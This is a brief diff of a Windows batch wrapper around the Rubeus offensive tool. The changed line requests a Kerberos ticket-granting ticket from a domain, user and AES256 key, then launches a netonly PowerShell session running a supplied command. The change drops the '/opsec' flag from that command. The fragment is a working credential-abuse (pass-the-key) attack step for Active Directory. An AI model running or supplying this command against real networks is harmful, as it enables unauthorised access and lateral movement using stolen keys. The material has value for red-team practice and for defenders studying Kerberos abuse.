@@ -31,7 +31,7 @@ IF defined rc4 (
 set /p aes256= "AES256:   "
 :aes256
 IF defined aes256 (
-  Rubeus.exe asktgt /domain:%domain% /user:%user% /aes256:%aes256% /opsec /createnetonly:"powershell.exe -NoExit -Command %powershellcmd%" /show
+  Rubeus.exe asktgt /domain:%domain% /user:%user% /aes256:%aes256% /createnetonly:"powershell.exe -NoExit -Command %powershellcmd%" /show
   goto commonexit
 )
 
